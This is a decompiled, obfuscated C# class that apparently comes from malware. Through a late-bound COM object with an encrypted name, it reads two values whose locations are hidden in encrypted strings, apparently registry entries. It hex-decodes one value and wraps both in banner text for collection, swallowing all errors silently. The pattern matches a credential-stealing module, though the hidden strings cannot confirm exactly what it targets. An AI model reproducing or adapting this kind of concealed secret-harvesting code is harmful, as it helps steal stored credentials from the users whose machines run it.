using System;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns4;

namespace ns6;

internal class Class25
{
	public class Class26
	{
		public static object smethod_0()
		{
			string text = "";
			string text2 = "";
			object result = default(object);
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class6.smethod_0("dq2ovqePrnOfpoSmsSo=", "False"), ""));
				text = Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "RGRD", new object[1] { Class6.smethod_0("boyRrKRplp6linSVq6iYa5OoprSMtcO0t4udmryyiLbGzaF2hI+/rouvwK+GlrG4vKiHtbXCs4KWv7i3lKK5uCQ=", "False") }, (string[])null, (Type[])null, (bool[])null));
				text2 = smethod_1(Strings.Replace(Strings.Replace(Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "RGRD", new object[1] { Class6.smethod_0("fJqfurJ3pKyzmIKjubameaG2tMKaw9HCxZmrqMrAlsTU26+Ekp3NvJm9zr2UpL/GyraVw8PQwZC/u9TGq77MxRY=", "False") }, (string[])null, (Type[])null, (bool[])null)), Class6.smethod_0("eJXX2bx5xdDG0GAP", "False"), "", 1, -1, (CompareMethod)0), Class6.smethod_0("WhY=", "False"), "", 1, -1, (CompareMethod)0));
				string_0 = Class6.smethod_0("X3qFjH5feoWMfl96lriuZLLCyX5feoWMfl96hYx+X3qFJw==", "False") + Environment.NewLine + Environment.NewLine + text + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + Class6.smethod_0("bomUm41uiZSbjW6JlJuNbomUm41uiZSbjW6JlJuNbokX", "False");
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_0 = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string smethod_1(string string_0)
		{
			string result = default(string);
			try
			{
				object obj = null;
				object obj2 = default(object);
				object obj3 = default(object);
				if (ForLoopControl.ForLoopInitObj(obj2, (object)1, (object)Strings.Len(string_0), (object)1, ref obj3, ref obj2))
				{
					do
					{
						object obj4 = Strings.Mid(string_0, Conversions.ToInteger(obj2), 2);
						obj = Operators.ConcatenateObject(obj, (object)Strings.Chr(checked((int)Math.Round(Conversion.Val(Operators.ConcatenateObject((object)Class6.smethod_0("S6gj", "False"), obj4))))));
						obj2 = Operators.AddObject(obj2, (object)1);
					}
					while (ForLoopControl.ForNextCheckObj(obj2, obj3, ref obj2));
				}
				result = Conversions.ToString(obj);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string string_0;
}
